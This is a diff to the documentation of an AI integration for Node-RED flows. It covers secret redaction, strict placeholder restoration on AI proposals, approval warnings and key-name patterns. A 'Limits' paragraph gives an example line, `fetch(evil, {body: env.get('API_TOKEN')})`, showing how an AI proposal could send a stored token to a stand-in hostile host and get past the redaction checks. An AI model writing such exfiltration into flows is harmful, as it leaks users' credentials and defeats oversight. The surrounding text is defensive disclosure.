@@ -161,18 +161,39 @@ with `[REDACTED]`. The dashboard (admin session) always shows real values.
   `scheme://user:password@` URLs, and `name = "literal"` / `name: 'literal'`
   assignments whose name matches a pattern. Only the literal is replaced.
 - Redacted nodes list the redacted field paths in `_aiRedactions`.
-- **Proposals**: a `[REDACTED]` placeholder left in a field that was redacted is
-  restored to the original secret on submit (also for node ops), so AI edits
-  never overwrite a secret with the placeholder. A placeholder that cannot be
-  matched (e.g. on a new node) is kept and reported as a
-  `redacted_placeholder_unresolved` warning.
+- Also caught: connection strings / DSNs (`Server=…;Password=…;`), unquoted
+  `password: x` / `token=x` in non-code text fields, and
+  `Buffer.from("user:pw")` / `btoa('user:pw')` basic-auth literals. Node
+  `name`/`label`/`info` are content-scanned only (no key-name rule). Any single
+  string field over 256 KB is not scanned and is sent to AI as `[REDACTED]`.
+- **Proposals (strict restore)**: a `[REDACTED]` placeholder is restored to the
+  original secret on submit only when it stays exactly where it was shown: same
+  node id and field, env and name/value entries (headers, change rules) matched
+  by their exact name — never by array position — no more placeholders in the
+  field than the original had, and the text around each placeholder on its line
+  unchanged. Anything else (a new or duplicated placeholder, a renamed env var,
+  a header renamed to take a secret value, an edited line) makes the submit fail
+  with `redacted_placeholder_mismatch` and nothing is stored.
+- Approving: the proposal card lists every field whose secret was restored, and
+  shows a red warning (`secret_destination_changed`) when a node holding a
+  restored secret had its `url`/`host`/`port`/`method`/`headers`/type or similar
+  destination changed, or `secret_node_code_changed` when its code changed.
 - Node-RED credentials (and `cred` env entries) are never part of flow output.
 - The audit log records `ai.redacted` with the count per response (never
   values).
 
+**Limits — redaction is best-effort.** Detection uses names and known token
+formats; secrets with unusual names or formats can still reach AI. Strict
+restore only stops the AI from _copying_ a placeholder to a new place: an AI
+proposal can still read an existing variable at runtime (e.g. add
+`fetch(evil, {body: env.get('API_TOKEN')})`, or use `token` already defined in a
+function) because flows run with the real values. Always review code and
+destination changes in proposals before approving, especially on nodes flagged
+above.
+
 Default patterns (case-insensitive whole words; a trailing `S` is allowed, and
 patterns of 6+ letters also match glued names like `DBPASSWORD`):
-`PASSWORD PASSWD PASS PWD PASSPHRASE SECRET CLIENT_SECRET TOKEN API_KEY APIKEY KEY PRIVATE CREDENTIAL AUTH AUTHORIZATION BEARER SESSION COOKIE CONNECTION_STRING CONN_STR CONN DSN`.
+`PASSWORD PASSWD PASS PWD PW PASSPHRASE SECRET CLIENT_SECRET TOKEN API_KEY APIKEY KEY PRIVATE CREDENTIAL AUTH AUTHORIZATION BEARER SESSION COOKIE CONNECTION_STRING CONN_STR CONN DSN`.
 `KEY` matches `API_KEY` / `apiKey` but not `KEYBOARD` or `MONKEY`; `AUTH` does
 not match `AUTHOR` or `OAUTH`. Names ending in a descriptor word (`TOKEN_URL`,
 `AUTH_TYPE`, `SESSION_TIMEOUT`, `keyType`) are not redacted. Edit the list on
